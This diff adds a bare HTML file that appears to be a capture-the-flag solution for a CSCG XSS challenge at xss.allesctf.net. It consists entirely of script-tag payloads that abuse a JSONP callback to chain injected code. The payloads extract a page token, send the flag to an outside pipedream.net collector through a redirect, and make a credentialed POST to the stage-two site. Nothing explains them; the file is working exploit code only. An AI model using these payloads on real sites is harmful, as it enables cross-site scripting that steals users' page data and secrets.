@@ -1,0 +1,6 @@
+<script src='http://xss.allesctf.net/items.php?cb=var%20a=/[a-f0-9]{13}/.exec(document.body.innerHTML);//'></script>
+<script src='http://xss.allesctf.net/items.php?cb=var%20b=decodeURI("%2522%253Cscript%253Ewindow.location.href=%2527https://en5ocv9177twt.x.pipedream.net/%2527%252Bdocument.body.innerHTML.match(/CSCG%257B.*%257D/g)[1];%253C/script%253E%2522");//'></script>
+<script src='http://xss.allesctf.net/items.php?cb=var%20c=decodeURI("id%252522%253E%253Cform%2520name=%252522backgrounds%252522%2520id=")%2bb%2bdecodeURI("%252522%253E%253C/form%253E%253Ca%2520href=%2527");//'></script>
+<script src='http://xss.allesctf.net/items.php?cb=fetch("http://stage2.xss.allesctf.net/?token="%2ba,{headers:{"Content-type":"application/x-www-form-urlencoded"},method:"POST",body:"bg="%2bc,credentials:"include",mode:"no-cors"});//'></script>
+<script src='http://xss.allesctf.net/items.php?cb=window.location.href="http://stage2.xss.allesctf.net/?token="%2ba;//'></script>
+
